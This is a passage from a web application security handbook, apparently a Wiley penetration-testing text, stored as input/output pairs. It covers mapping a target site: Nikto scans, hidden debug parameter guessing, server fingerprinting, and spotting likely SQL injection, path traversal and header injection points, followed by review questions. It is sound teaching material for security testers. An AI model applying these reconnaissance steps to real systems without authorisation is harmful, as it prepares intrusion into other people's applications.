during development, known security bugs, configuration and\nlog files submitted to assist troubleshooting, and even extracts of source code.\nHACK STEPS\n■ Compile a list containing every name and email address you can discover\nrelating to the target application and its development. This should include\nany known developers, names found within HTML source code, names found\nin the contact information section of the main company web site, and any\nnames disclosed within the application itself, such as administrative staff.\n■ Using the search techniques described previously, search for each identi-\nfied name, to find any questions and answers they have posted to Inter-\nnet forums. Review any information found for clues about functionality\nor vulnerabilities within the target application.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 75\nChapter 4 ■ Mapping the Application 75\nLeveraging the Web Server\nVulnerabilities may exist at the web server layer that enable you to discover\ncontent and functionality that is not linked within the web application itself.\nFor example, there have been numerous bugs within web server software that\nallow an attacker to list the contents of directories, or obtain the raw source for\ndynamic server-executable pages. See Chapter 17 for some examples of these\nvulnerabilities, and ways in which you can identify them. If such a bug exists,\nyou may be able to exploit it to directly obtain a listing of all pages and other\nresources within the application.\nMany web servers ship with default content that may assist you in attacking\nthem—for example, sample and diagnostic scripts that may contain known\nvulnerabilities, or contain functionality that may be leveraged for some mali-\ncious purpose. Further, many web applications incorporate common third-\nparty components that they use for various standard functions—for example,\nscripts to implement a shopping cart or interface to email servers. Nikto is a\nhandy tool that issues requests for a wide range of default web server content,\nthird-party application components, and common directory names. While\nNikto will not rigorously test for any hidden bespoke functionality, it can often\nbe useful in discovering other resources that are not linked within the applica-\ntion and that may be of interest in formulating an attack:\nmanicsprout@king nikto-1.35]# perl nikto.pl\n-----------------------------------------------------------------------\n- Nikto 1.34/1.29 - www.cirt.net\n+ Target IP: 127.0.0.1\n+ Target Hostname: localhost\n+ Target Port: 80\n+ Start Time: Sat Feb 3 12:03:36 2007\n-----------------------------------------------------------------------\n- Scan is dependent on “Server” string which can be faked, use -g to\noverride\n+ Server ID string not sent\n- Server did not understand HTTP 1.1, switching to HTTP 1.0\n+ /bin/ - This might be interesting... (GET)\n+ /client/ - This might be interesting... (GET)\n+ /oracle - Redirects to /oracle/ , This might be interesting...\n+ /temp/ - This might be interesting... (GET)\n+ /cgi-bin/login.pl - This might be interesting... (GET)\n+ 3198 items checked - 6 item(s) found on remote host(s)\n+ End Time: Sat Feb 3 12:03:55 2007 (19 seconds)\n-----------------------------------------------------------------------\n+ 1 host(s) tested\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 76\n76 Chapter 4 ■ Mapping the Application\nHACK STEPS\nThere are several useful options available when running Nikto:\n■ If you believe that the server is using a nonstandard location for interest-\ning content that Nikto checks for (for example /cgi/cgi-bininstead of\n/cgi-bin) you can specify this alternate location using the option –root\n/cgi/. For the specific case of CGI directories, these can also be speci-\nfied using the option –Cgidirs.\n■ If the site uses a custom “file not found” page that does not return the\nHTTP 404 status code, you can specify a particular string that identifies\nthis page by using the -404option.\n■ Be aware that Nikto does not perform any intelligent verification of\npotential issues and so is prone to report false positives. Always check\nany results returned by Nikto manually.\nApplication Pages vs. Functional Paths\nThe enumeration techniques described so far have been implicitly driven by\none particular picture of how web application content may be conceptualized\nand catalogued. This picture is inherited from the pre-application days of the\nWorld Wide Web, in which web servers functioned as repositories of static\ninformation, retrieved using URLs that were effectively filenames. To publish\nsome web content, an author simply generated a bunch of HTML files and\ncopied these into the relevant directory on a web server. When users followed\nhyperlinks, they navigated around the set of files created by the author,\nrequesting each file via its name within the directory tree residing on the\nserver.\nAlthough the evolution of web applications has fundamentally changed the\nexperience of interacting with the Web, the picture just described is still applic-\nable to the majority of web application content and functionality. Individual\nfunctions are typically accessed via a unique URL, which is usually the name\nof the server-side script that implements the function. The parameters to the\nrequest (residing in either the URL query string or the body of a POSTrequest)\ndo not tell the application what function to perform—they tell it what infor-\nmation to use when performing it. In this context, the methodology of con-\nstructing a URL-based map can be effective in cataloging the functionality of\nthe application.\nIn some applications, however, the picture based on application “pages” is\ninappropriate. While it may be logically possible to shoehorn any application’s\nstructure into this form of representation, there are many cases in which a\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 77\nChapter 4 ■ Mapping the Application 77\ndifferent picture, based on functional paths, is far more useful for cataloging\nits content and functionality. Consider an application that is accessed using\nonly requests of the following form:\nPOST /bank.jsp HTTP/1.1\nHost: wahh-bank.com\nContent-Length: 106\nservlet=TransferFunds&method=confirmTransfer&fromAccount=10372918&toAcco\nunt=3910852&amount=291.23&Submit=Ok\nHere, every request is made to a single URL. The parameters to the request\nare used to tell the application what function to perform, by naming the Java\nservlet and method to invoke. Further parameters provide the information to\nuse in performing the function. In the picture based on application pages, the\napplication will appear to have only a single function, and a URL-based map\nwill not elucidate its functionality. However, if we map the application in\nterms of functional paths, we can obtain a much more informative and useful\ncatalogue of its functionality. Figure4-5 is a partial map of the functional paths\nthat exist within the application.\nWahhBank.\nlogin\nWahhBank.\nhome\nTransferFunds. BillPayment. BillPayment. WahhBank.\nselectAccounts addPayee selectPayee logout\nTransferFunds. BillPayment.\nenterAmount enterAmount\nTransferFunds. BillPayment.\nconfirmTransfer confirmPayment\nFigure4-5: A mapping of the functional paths within a web application\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 78\n78 Chapter 4 ■ Mapping the Application\nRepresenting an application’s functionality in this way is often more useful\neven in cases where the usual picture based on application pages can be\napplied without any problems. The logical relationships and dependencies\nbetween different functions may not correspond to the directory structure\nused within URLs. It is these logical relationships that are of most interest to\nyou, both in understanding the core functionality of the application, and in\nformulating possible attacks against it. By identifying these, you can better\nunderstand the expectations and assumptions of the application’s developers\nwhen implementing the functions, and attempt to find ways of violating these\nassumptions, causing unexpected behavior within the application.\nIn applications where functions are identified using a request parameter,\nrather than the URL, this has implications for the enumeration of application\ncontent. In the previousexample, the content discovery exercises described so\nfar are unlikely to uncover any hidden content. Those techniques need to be\nadapted to the mechanisms actually used by the application for accessing\nfunctionality.\nHACK STEPS\n■ Identify any instances where application functionality is accessed not by\nrequesting a specific page for that function (e.g., /admin/editUser.jsp)\nbut by passing the name of a function in a parameter (e.g., /admin\n.jsp?action=editUser).\n■ Modify the automated techniques described for discovering URL-\nspecified content to work on the content-access mechanisms in use\nwithin the application. For example, if the application uses parameters\nwhich specify servlet and method names, first determine its behavior\nwhen an invalid servlet and/or method is requested, and when a valid\nmethod is requested with invalid other parameters. Try to identify attrib-\nutes of the server’s responses that indicate “hits”—i.e., valid servlets and\nmethods. If possible, find a way of attacking the problem in two stages,\nfirst enumerating servlets and then methods within these. Using a similar\nmethod to the one used for URL-specified content, compile lists of com-\nmon items, add to these by inferring from the names actually observed,\nand generate large numbers of requests based on these.\n■ If applicable, compile a map of application content based on functional\npaths, showing all of the enumerated functions and the logical paths and\ndependencies between them."
  },
  {
    "input": "Analyzing the Application",
    "output": "70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 79\nChapter 4 ■ Mapping the Application 79\nDiscovering Hidden Parameters\nA variation on the situation where an application uses request parameters to\nspecify which function should be performed arises where other parameters\nare used to control the application’s logic in significant ways. For example, an\napplication may behave differently if the parameter debug=true is added to\nthe query string of any URL—it might turn off certain input validation\nchecks, allow the user to bypass certain access controls, or display verbose\ndebug information in its response. In many cases, the fact that the application\nhandles this parameter cannot be directly inferred from any of its content (for\nexample, it does not include debug=false in the URLs that it publishes as\nhyperlinks). The effect of the parameter can only be detected by guessing a\nrange of values until the correct one is submitted.\nHACK STEPS\n■ Using lists of common debug parameter names (debug, test, hide, source,\netc.) and common values (true, yes, on, 1, etc.), make a large number of\nrequests to a known application page or function, iterating through all\npermutations of name and value. For POSTrequests, insert the added\nparameter both into the URL query string and into the message body.\n■ Burp Intruder can be used to perform this test using multiple payload\nsets and the “cluster bomb” attack type (see Chapter 13 for more\ndetails).\n■ Monitor all responses received to identify any anomalies that may indi-\ncate that the added parameter has had an effect on the application’s\nprocessing.\n■ Depending on the time available, target a number of different pages or\nfunctions for hidden parameter discovery. Choose functions where it is\nmost likely that developers have implemented debug logic, such as login,\nsearch, file uploading and downloading, and the like.\nAnalyzing the Application\nEnumerating as much of the application’s content as possible is only one ele-\nment of the mapping process. Equally important is the task of analyzing the\napplication’s functionality, behavior, and technologies employed, in order to\nidentify the key attack surfaces that it exposes, and begin formulating an\napproach to probing the application for exploitable vulnerabilities.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 80\n80 Chapter 4 ■ Mapping the Application\nSome key areas to investigate are:\n■■ The core functionality of the application—the actions that it can be\nleveraged to perform when used as intended.\n■■ Other more peripheral behavior of the application, including off-site\nlinks, error messages, administrative and logging functions, use of redi-\nrects, and so on.\n■■ The core security mechanisms and how they function, in particular\nmanagement of session state, access controls, and authentication mech-\nanisms and supporting logic (user registration, password change,\naccount recovery, etc.).\n■■ All of the different locations at which user-supplied input is processed\nby the application—every URL, query string parameter, item of POST\ndata, cookie, and the like.\n■■ The technologies employed on the client side, including forms, client-\nside scripts, thick-client components (Java applets, ActiveX controls,\nand Flash), and cookies.\n■■ The technologies employed on the server side, including static and\ndynamic pages, the types of request parameters employed, use of SSL,\nweb server software, interaction with databases, email systems and\nother back-end components.\n■■ Any other details that may be gleaned about the internal structure and\nfunctionality of the server-side application—the mechanisms it uses\nbehind the scenes to deliver the functionality and behavior that is visi-\nble from the client perspective.\nIdentifying Entry Points for User Input\nThe majority of ways in which the application captures user input for server-\nside processing should be obvious when reviewing the HTTP requests that are\ngenerated as you walk through the application’s functionality. The key loca-\ntions to pay attention to are:\n■■ Every URL string up to the query string marker.\n■■ Every parameter submitted within the URL query string.\n■■ Every parameter submitted within the body of a POSTrequest.\n■■ Every cookie.\n■■ Every other HTTP header that in rare cases may be processed by the\napplication, in particular the User-Agent, Referer, Accept, Accept-\nLanguage, and Hostheaders.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 81\nChapter 4 ■ Mapping the Application 81\nSome applications do not employ the standard query string format (which\nwas described in Chapter 3), but employ their own custom scheme, which\nmay use nonstandard query string markers and field separators, may embed\nother data schemes such as XML within the query string, or may effectively\nplace the query string within what appears to be the directory or filename por-\ntion of the URL. Here are some examples of nonstandard query string formats\nthat the authors have encountered in the wild:\n■■ /dir/file;foo=bar&foo2=bar2\n■■ /dir/file?foo=bar$foo2=bar2\n■■ /dir/file/foo%3dbar%26foo2%3dbar2\n■■ /dir/foo.bar/file\n■■ /dir/foo=bar/file\n■■ /dir/file?param=foo:bar\n■■ /dir/file?data=\n%3cfoo%3ebar%3c%2ffoo%3e%3cfoo2%3ebar2%3c%2ffoo2%3e\nIf a nonstandard query string format is being used, then you will need to\ntake account of this when probing the application for all kinds of common vul-\nnerabilities. For example, when testing the final URL in this list, if you were to\nignore the custom format and simply treat the query string as containing a sin-\ngle parameter called data, and so submit various kinds of attack payloads as\nthe value of this parameter, you would miss many kinds of vulnerability that\nmay exist in the processing of the query string. If, conversely, you dissect the\nformat and place your payloads within the embedded XML data fields, you\nmay immediately discover a critical bug such as SQL injection or path\ntraversal.\nA final class of entry points for user input includes any out-of-band channel\nby which the application receives data that you may be able to control. Some\nof these entry points may be entirely undetectable if you simply inspect the\nHTTP traffic generated by the application, and finding them usually requires\nan understanding of the wider context of the functionality that the application\nimplements. Some examples of web applications that receive user-controllable\ndata via an out-of-band channel include:\n■■ A web mail application which processes and renders email messages\nreceived via SMTP.\n■■ A publishing application that contains a function to retrieve content via\nHTTP from another server.\n■■ An intrusion detection application that gathers data using a network\nsniffer and presents this using a web application interface.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 82\n82 Chapter 4 ■ Mapping the Application\nIdentifying Server-Side Technologies\nIt is normally possible to fingerprint the technologies employed on the server\nvia various clues and indicators.\nBanner Grabbing\nMany web servers disclose fine-grained version information, both about the\nweb server software itself and about other components that have been\ninstalled. For example, the HTTP Server header discloses a huge amount of\ndetail about some installations:\nServer: Apache/1.3.31 (Unix) mod_gzip/1.3.26.1a mod_auth_passthrough/1.8\nmod_log_bytes/1.2 mod_bwlimited/1.4 PHP/4.3.9 FrontPage/5.0.2.2634a\nmod_ssl/2.8.20 OpenSSL/0.9.7a\nIn addition to the Serverheader, other locations where the type and version\nof software may be disclosed are:\n■■ Templates used to build HTML pages\n■■ Custom HTTP headers\n■■ URL query string parameters\nHTTP Fingerprinting\nIn principle, any item of information returned by the server may be cus-\ntomized or even deliberately falsified, and banners like the Serverheader are\nno exception. Some web server software includes a facility for administrators\nto set an arbitrary value for the Serverheader. Further, there are security prod-\nucts that use various methods to try to prevent a web server’s software from\nbeing detected, such as ServerMask by Port80 Software.\nAttempting to grab the server banner from Port80’s own web server does\nnot appear to disclose much useful information:\nHEAD / HTTP/1.0\nHost: www.port80software.com\nHTTP/1.1 200 OK\nDate: Sun, 04 Mar 2007 16:14:26 GMT\nServer: Yes we are using ServerMask!\nSet-Cookie: countrycode=UK; path=/\nSet-Cookie: ALT.COOKIE.NAME.2=89QMSN102,S62OS21C51N2NP,,0105,N7; path=/\nCache-control: private\nContent-Length: 27399\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 83\nChapter 4 ■ Mapping the Application 83\nConnection: Keep-Alive\nContent-Type: text/html\nSet-Cookie: Coyote-2-d1f579d9=ac1000d9:0; path=/\nDespite measures such as this, it is usually possible for a determined\nattacker to use other aspects of the web server’s behavior to determine the\nsoftware in use, or at least narrow down the range of possibilities. The HTTP\nspecification contains a lot of detail that is optional or left to an implementer’s\ndiscretion. Further, many web servers deviate from or extend the specification\nin various different ways. As a result, there are numerous subtle ways in which\na web server can be fingerprinted, other than via its Serverbanner. Httprint is\na handy tool that performs a number of tests in an attempt to fingerprint a web\nserver’s software. In the case of Port80 Software’s server, it reports with a 58%\ndegree of confidence that the server software in use is in fact Microsoft IIS ver-\nsion 5.1, as shown in Figure4-6.\nFigure4-6: Httprint fingerprinting various different web servers\nThe screenshot also illustrates how Httprint can defeat other kinds of\nattempts to mislead about the web server software being used. The Found-\nstone web site uses a misleading banner, but Httprint can still discover the\nactual software. And the RedHat server is configured to present the nonver-\nbose banner “Apache,” but Httprint is able to deduce the specific version of\nApache being used with a high degree of confidence.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 84\n84 Chapter 4 ■ Mapping the Application\nFile Extensions\nFile extensions used within URLs often disclose the platform or programming\nlanguage used to implement the relevant functionality. For example:\n■■ asp—Microsoft Active Server Pages\n■■ aspx—Microsoft ASP.NET\n■■ jsp—Java Server Pages\n■■ cfm—Cold Fusion\n■■ php—the PHP language\n■■ d2w—WebSphere\n■■ pl—the Perl language\n■■ py—the Python language\n■■ dll—usually compiled native code (C or C++)\n■■ nsfor ntf—Lotus Domino\nEven if an application does not employ a particular file extension in its pub-\nlished content, it is usually possible to verify whether the technology support-\ning that extension is implemented on the server. For example, if ASP.NET is\ninstalled, requesting a nonexistent .aspx file will return a customized error\npage generated by the ASP.NET framework, as shown in Figure 4-7, whereas\nrequesting a nonexistent file with a different extension returns a generic error\nmessage generated by the web server, as shown in Figure4-8.\nFigure4-7: A customized error page indicating that the ASP.NET platform is present\non the server\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 85\nChapter 4 ■ Mapping the Application 85\nFigure4-8: A generic error message created when an unrecognized file extension is\nrequested\nUsing the automated content discovery techniques already described, it is\npossible to request a large number of common file extensions and quickly con-\nfirm whether any of the associated technologies are implemented on the\nserver.\nThe divergent behavior described arises because many web servers map\nspecific file extensions to particular server-side components. Each different\ncomponent may handle errors (including requests for nonexistent content) in\na different way. Figure 4-9 shows the various extensions that are mapped to\ndifferent handler DLLs in a default installation of IIS 5.0.\nFigure4-9: File extension mappings in IIS 5.0\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 86\n86 Chapter 4 ■ Mapping the Application\nIt is possible to detect the presence of each file extension mapping via the\ndifferent error messages generated when that file extension is requested.\nIn some cases, discovering a particular mapping may indicate the presence\nof a web server vulnerability—for example, the .printer and .ida/.idq\nhandlers in IIS have in the past been found vulnerable to buffer overflow\nvulnerabilities.\nAnother common fingerprint to be aware of are URLs that look like the\nfollowing:\nhttps://wahh-app/news/0,,2-421206,00.html\nThe comma-separated numbers towards the end of the URL are usually gen-\nerated by the Vignette content management platform.\nDirectory Names\nIt is common to encounter subdirectory names that indicate the presence of an\nassociated technology. For example:\n■■ servlet—Java servlets\n■■ pls—Oracle Application Server PL/SQL gateway\n■■ cfdocsor cfide—Cold Fusion\n■■ SilverStream—The SilverStream web server\n■■ WebObjectsor {function}.woa—Apple WebObjects\n■■ rails—Ruby on Rails\nSession Tokens\nMany web servers and web application platforms generate session tokens by\ndefault with names that provide information about the technology in use. For\nexample:\n■■ JSESSIONID—The Java Platform\n■■ ASPSESSIONID—Microsoft IIS server\n■■ ASP.NET_SessionId—Microsoft ASP.NET\n■■ CFID/CFTOKEN—Cold Fusion\n■■ PHPSESSID—PHP\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 87\nChapter 4 ■ Mapping the Application 87\nThird-Party Code Components\nMany web applications incorporate third-party code components to imple-\nment common functionality such as shopping carts, login mechanisms, and\nmessage boards. These may be open source or may have been purchased from\nan external software developer. When this is the case, the same components\noften appear within numerous other web applications on the Internet, which\nyou can inspect to understand how the component functions. Often, different\nfeatures of the same component will be made use of by other applications,\nenabling you to identify additional behavior and functionality beyond what is\ndirectly visible in the target application. Also, the software may contain known\nvulnerabilities that have been discussed elsewhere, or you may be able to\ndownload and install the component yourself and perform a source code\nreview or probe it for defects in a controlled way.\nHACK STEPS\n■ Identify all entry points for user input, including URLs, query string para-\nmeters, POSTdata, cookies, and other HTTP headers processed by the\napplication.\n■ Examine the query string format used by the application. If it does not\nemploy the standard format described in Chapter 3, try to understand\nhow parameters are being transmitted via the URL. Virtually all custom\nschemes still employ some variation on the name/value model, so try to\nunderstand how name/value pairs are being encapsulated into the non-\nstandard URLs you have identified.\n■ Identify any out-of-bound channels via which user-controllable or other\nthird-party data is being introduced into the application’s processing.\n■ View the HTTP Server banner returned by the application. Note that in\nsome cases, different areas of the application are handled by different\nback-end components, and so different Serverheaders may be\nreceived.\n■ Check for any other software identifiers contained within any custom\nHTTP headers or HTML source code comments.\n■ Run the Httprint tool to fingerprint the web server.\n■ If fine-grained information is obtained about the web server and other\ncomponents, research the software versions in use to identify any vulner-\nabilities that may be exploited to advance an attack (see Chapter 17).\n■ Review your map of application URLs, to identify any interesting-looking\nfile extensions, directories, or other subsequences that may provide clues\nabout the technologies in use on the server.\n(continued)\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 88\n88 Chapter 4 ■ Mapping the Application\nHACK STEPS (continued)\n■ Review the names of all session tokens issued by the application to iden-\ntify the technologies being used.\n■ Use lists of common technologies, or Google, to establish which tech-\nnologies may be in use on the server, or discover other web sites and\napplications that appear to be employing the same technologies.\n■ Perform searches on Google for the names of any unusual cookies,\nscripts, HTTP headers, and the like that may belong to third-party soft-\nware components. If you locate other applications in which the same\ncomponents are being used, review these to identify any additional\nfunctionality and parameters that the components support, and verify\nwhether these are also present in your target application. Note that third-\nparty components may look and feel quite different in each implementa-\ntion, due to branding customizations, but the core functionality, including\nscript and parameter names, is often the same. If possible, download and\ninstall the component and analyze it to fully understand its capabilities\nand if possible discover any vulnerabilities. Consult repositories of\nknown vulnerabilities to identify any known defects with the component\nin question.\nIdentifying Server-Side Functionality\nIt is often possible to infer a great deal about server-side functionality and\nstructure, or at least make an educated guess, by observing clues that the\napplication discloses to the client.\nDissecting Requests\nConsider the following URL, which is used to access a search function:\nhttps://wahh-app.com/calendar.jsp?name=new%20applicants&isExpired=\n0&startDate=22%2F09%2F2006&endDate=22%2F03%2F2007&OrderBy=name\nAs we have seen, the .jspfile extension indicates that Java Server Pages are\nin use. You may guess that a search function will retrieve its information from\neither an indexing system or a database; the presence of the OrderByparame-\nter suggests that a back-end database is being used, and that the value you\nsubmit may be used as the ORDER BY clause of a SQL query. This parameter\nmay well be vulnerable to SQL injection, as may any of the other parameters if\nthey are used in database queries (see Chapter 9).\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 89\nChapter 4 ■ Mapping the Application 89\nAlso of interest among the other parameters is the isExpired field. This\nappears to be a Boolean flag specifying whether the search query should\ninclude content which is expired. If the application designers did not expect\nordinary users to be able retrieve any expired content, changing this parame-\nter from 0 to 1 could identify an access control vulnerability (see Chapter 8).\nThe following URL, which allows users to access a content management\nsystem, contains a different set of clues:\nhttps://wahh-app.com/workbench.aspx?template=NewBranch.tpl&loc=\n/default&ver=2.31&edit=false\nHere, the .aspxfile extension indicates that this is an ASP.NET application.\nIt also appears highly likely that the template parameter is used to specify a\nfilename, and the locparameter is used to specify a directory. The possible file\nextension .tpl appears to confirm this, as does the location /default, which\ncould very well be a directory name. It is possible that the application retrieves\nthe template file specified and includes the contents into its response. These\nparameters may well be vulnerable to path traversal attacks, allowing arbi-\ntrary files to be read from the server (see Chapter 10).\nAlso of interest is the edit parameter, which is set to false. It may be that\nchanging this value to true will modify the registration functionality, poten-\ntially enabling an attacker to edit items that the application developer did not\nintend to be editable. The verparameter does not have any readily guessable\npurpose, but it may be that modifying this will cause the application to per-\nform a different set of functions that may be exploitable by an attacker.\nFinally, consider the following request, which is used to submit a question to\napplication administrators:\nPOST /feedback.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 389\nfrom=user@wahh-mail.com&to=helpdesk@wahh-app.com&subject=\nProblem+logging+in&message=Please+help...\nAs with the other examples, the .php file extension indicates that the func-\ntion is implemented using the PHP language. Further, it is extremely likely\nthat the application is interfacing with an external email system, and it appears\nthat user-controllable input is being passed to that system in all relevant fields\nof the email. The function may be exploitable to send arbitrary messages to\nany recipient, and any of the fields may also be vulnerable to email header\ninjection (see Chapter 9).\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 90\n90 Chapter 4 ■ Mapping the Application\nHACK STEPS\n■ Review the names and values of all parameters being submitted to the\napplication, in the context of the functionality which they support.\n■ Try to think like a programmer, and imagine what server-side mecha-\nnisms and technologies are likely to have been used to implement the\nbehavior that you can observe.\nExtrapolating Application Behavior\nOften, an application behaves in a consistent way across the range of its func-\ntionality. This may be because different functions were written by the same\ndeveloper, or to the same design specification, or share some common code\ncomponents. In this situation, it may be possible to draw conclusions about\nserver-side functionality in one area and extrapolate these to another area.\nFor example, the application may enforce some global input validation\nchecks, such as sanitizing various kinds of potentially malicious input before\nit is processed. Having identified a blind SQL injection vulnerability, you may\nencounter problems exploiting it, because your crafted requests are being\nmodified in unseen ways by the input validation logic. However, there may be\nother functions within the application that provide good feedback about the\nkind of sanitization being performed—for example, a function that echoes\nsome user-supplied data back to the browser. You may be able to use this func-\ntion to test different encodings and variations of your SQL injection payload,\nto determine what raw input must be submitted to achieve the desired attack\nstring after the input validation logic has been applied. If you are lucky, the\nvalidation works in the same way across the application, enabling you to\nexploit the injection flaw.\nSome applications use custom obfuscation schemes when storing sensitive\ndata on the client, to prevent casual inspection and modification of this data by\nusers (see Chapter 5). Some such schemes may be extremely difficult to deci-\npher given access to only a sample of obfuscated data. However, there may be\nfunctions within the application where a user can supply an obfuscated string\nand retrieve the original—for example, an error message may include the\ndeobfuscated data which led to the error. If the same obfuscation scheme is\nused throughout the application, it may be possible to take an obfuscated\nstring from one location (for example a cookie), and feed it into the other func-\ntion to decipher its meaning. It may also be possible to reverse engineer the\nobfuscation scheme by submitting systematically varying values to the func-\ntion and monitoring their deobfuscated equivalents.\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 91\nChapter 4 ■ Mapping the Application 91\nFinally, errors are often handled in an inconsistent manner within the appli-\ncation, with some areas trapping and handling errors gracefully, while other\nareas simply crash and return verbose debugging information to the user (see\nChapter 14). In this situation, it may be possible to gather information from the\nerror messages returned in one area and apply it to other areas where errors\nare gracefully handled. For example, by manipulating request parameters in\nsystematic ways and monitoring the error messages received, it may be possi-\nble to determine the internal structure and logic of the application component\nconcerned; if you are lucky, aspects of this structure may be replicated in other\nareas.\nHACK STEPS\n■ Try to identify any locations within the application that may contain clues\nabout the internal structure and functionality of other areas.\n■ It may not be possible to draw any firm conclusions here; however, the\ncases identified may prove useful at a later stage of the attack when\nattempting to exploit any potential vulnerabilities.\nMapping the Attack Surface\nThe final stage of the mapping process is to identify the various attack surfaces\nexposed by the application, and the potential vulnerabilities that are com-\nmonly associated with each one. The following is a rough guide to some key\ntypes of behavior and functionality that you may identify, and the kinds of\nvulnerability that are most commonly found within each one. The remainder\nof this book will be concerned with the practical details of how you can detect\nand exploit each of these problems:\n■■ Client-side validation—Checks may not be replicated on the server.\n■■ Database interaction—SQL injection.\n■■ File uploading and downloading—Path traversal vulnerabilities.\n■■ Display of user-supplied data—Cross-site scripting.\n■■ Dynamic redirects—Redirection and header injection attacks.\n■■ Login—Username enumeration, weak passwords, ability to use brute\nforce.\n■■ Multistage login—Logic flaws.\n■■ Session state—Predictable tokens, insecure handling of tokens.\n■■ Access controls—Horizontal and vertical privilege escalation."
  },
  {
    "input": "Chapter Summary",
    "output": "70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 92\n92 Chapter 4 ■ Mapping the Application\n■■ User impersonation functions—Privilege escalation.\n■■ Use of cleartext communications—Session hijacking, capture of cre-\ndentials and other sensitive data.\n■■ Off-site links—Leakage of query string parameters in the Referer\nheader.\n■■ Interfaces to external systems—Shortcuts in handling of sessions\nand/or access controls.\n■■ Error messages—Information leakage.\n■■ Email interaction—Email and/or command injection.\n■■ Native code components or interaction—Buffer overflows.\n■■ Use of third-party application components—Known vulnerabilities.\n■■ Identifiable web server software—Common configuration weak-\nnesses, known software bugs.\nHACK STEPS\n■ Understand the core functionality implemented within the application\nand the main security mechanisms in use.\n■ Identity all features of the application’s functionality and behavior that\nare often associated with common vulnerabilities.\n■ Formulate a plan of attack prioritizing the most interesting-looking func-\ntionality and the most serious of the associated potential vulnerabilities.\nChapter Summary\nMapping the application is a key prerequisite to attacking it. While it may be\ntempting to dive straight in and start probing for actual bugs, taking time to\ngain a sound understanding of the application’s functionality, technologies,\nand attack surface will pay dividends down the line.\nAs with almost all of web application hacking, the most effective approach\nis to use manual techniques supplemented where appropriate by controlled\nautomation. There is no fully automated tool that can carry out a thorough\nmapping of the application in a safe way. To do this, you need to use your\nhands and draw on your own experience. The core methodology we have out-\nlined involves:\n■■ Manual browsing and user-directed spidering, to enumerate the appli-\ncation’s visible content and functionality."
  },
  {
    "input": "Questions",
    "output": "70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 93\nChapter 4 ■ Mapping the Application 93\n■■ Use of brute force combined with human inference and intuition to dis-\ncover as much hidden content as possible.\n■■ An intelligent analysis of the application, to identify its key functional-\nity, behavior, security mechanisms, and technologies.\n■■ An assessment of the application’s attack surface, highlighting the most\npromising functions and behavior for more focused probing into\nexploitable vulnerabilities.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. While mapping an application, you encounter the following URL:\nhttps://wahh-app.com/CookieAuth.dll?GetLogon?curl=\nZ2Fdefault.aspx\nWhat information can you deduce about the technologies employed on\nthe server, and how it is likely to behave?\n2. The application you are targeting implements web forum functionality.\nThe only URL you have discovered is:\nhttp://wahh-app.com/forums/ucp.php?mode=register\nHow might you obtain a listing of forum members?\n3. While mapping an application, you encounter the following URL:\nhttps://wahh-app.com/public/profile/Address.asp?action=\nview&location=default\nWhat information can you infer about server-side technologies? What\ncan you conjecture about other content and functionality that may\nexist?\n4. A web server’s responses include the following header:\nServer: Apache-Coyote/1.1\nWhat does this indicate about the technologies in use on the server?\n5. You are mapping two different web applications, and you request the\nURL /admin.cpffrom each application. The response headers returned\n70779c04.qxd:WileyRed 9/14/07 3:12 PM Page 94\n94 Chapter 4 ■ Mapping the Application\nby each request are shown here. From these headers alone, what can\nyou deduce about the presence of the requested resource within each\napplication?\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.0\nExpires: Mon, 25 Jun 2007 14:59:21 GMT\nContent-Location: http://wahh-app.com/includes/error.htm?404;http://\nwahh-app.com/admin.cpf\nDate: Mon, 25 Jun 2007 14:59:21 GMT\nContent-Type: text/html\nAccept-Ranges: bytes\nContent-Length: 2117\nHTTP/1.1 401 Unauthorized\nServer: Apache-Coyote/1.1\nWWW-Authenticate: Basic realm=”Wahh Administration Site”\nContent-Type: text/html;charset=utf-8\nContent-Length: 954\nDate: Mon, 25 Jun 2007 15:07:27 GMT\nConnection: close"
  },
  {
    "input": "Transmitting Data via the Client",
    "output": "70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 95\nCHAPTER\n5\nBypassing Client-Side Controls\nChapter 1 described how the core security problem with web applications\narises because clients can submit arbitrary input. Despite this fact, a large pro-\nportion of web applications nevertheless rely upon various kinds of measures\nimplemented on the client side to control the data that it submits to the server.\nIn general, this represents a fundamental security flaw: the user has full con-\ntrol over the client and the data it submits, and can bypass any controls which\nare implemented on the client side and not replicated on the server.\nThere are two broad ways in which an application may rely upon client-side\ncontrols to restrict user input. First, an application may transmit data via the\nclient component, using some mechanism that it assumes will prevent the user\nfrom modifying that data. Second, when an application gathers data that is\nentered by the user, it may implement measures on the client side that control\nthe contents of that data before it is submitted. This may be achieved using\nHTML form features, client-side scripts, or thick-client technologies.\nWe will look at examples of each kind of client-side control and describe\nways in which they can be bypassed.\nTransmitting Data via the Client\nIt is very common to see an application passing data to the client in a form that\nis not directly visible or modifiable by the end user, in the expectation that this\n95\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 96\n96 Chapter 5 ■ Bypassing Client-Side Controls\ndata will be sent back to the server in a subsequent request. Often, the appli-\ncation’s developers simply assume that the transmission mechanism used\nwill ensure that the data transmitted via the client will not be modified along\nthe way.\nBecause everything submitted from the client to the server is within the\nuser’s full control, the assumption that data transmitted via the client will not\nbe modified is usually false, and often leaves the application vulnerable to one\nor more attacks.\nYou may reasonably wonder why, if a particular item of data is known and\nspecified by the server, the application would ever need to transmit this value\nto the client and then read it back. In fact, 